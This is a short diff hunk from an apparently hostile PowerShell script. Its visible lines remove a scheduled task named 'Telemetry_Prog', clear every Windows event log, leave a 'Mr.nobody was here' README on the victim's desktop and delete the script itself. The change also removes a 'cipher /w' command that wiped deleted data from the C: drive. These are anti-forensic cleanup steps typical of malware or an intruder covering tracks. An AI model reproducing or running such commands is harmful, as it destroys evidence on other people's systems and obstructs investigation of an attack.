@@ -14,7 +14,5 @@ Unregister-ScheduledTask -TaskName "Telemetry_Prog" -Confirm:$false
 wevtutil el | Foreach-Object {wevtutil cl "$_"}
 # add README.md
 Set-Content -Path "C:\Users\$env:USERNAME\Desktop\README.md" -Value "Mr.nobody was here"
-# overwrite deleted data
-cipher /w:c:\
 # self destruct file
 Remove-Item -Path $MyInvocation.MyCommand.Source -Force
